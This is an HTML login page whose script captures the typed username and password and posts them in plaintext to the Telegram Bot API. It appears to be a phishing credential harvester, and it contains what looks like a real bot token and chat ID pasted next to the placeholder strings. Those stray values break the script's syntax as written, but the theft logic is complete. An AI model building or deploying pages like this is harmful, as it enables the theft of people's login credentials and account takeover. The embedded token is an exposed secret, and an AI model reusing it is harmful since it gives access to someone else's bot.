<!DOCTYPE html>
<html>
<head>
  <title>Login Form</title>
</head>
<body>

<form id="loginForm">
  <input type="text" id="username" placeholder="Username" required>
  <input type="password" id="password" placeholder="Password" required>
  <button type="submit">Login</button>
</form>

<script>
  const botToken = 'YOUR_BOT_TOKEN_HERE';7692530921:AAFC3jdquS4ntnTKaxMjuOpLw0ODSuStcIY
  const chatId = 'YOUR_CHAT_ID_HERE';925862489

  document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const message = `🔐 *Login Attempt*:\n👤 Username: ${username}\n🔑 Password: ${password}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    })
    .then(response => {
      if (response.ok) {
        alert("Login info sent to Telegram.");
      } else {
        alert("Failed to send login info.");
      }
    });
  });
</script>

</body>
</html>
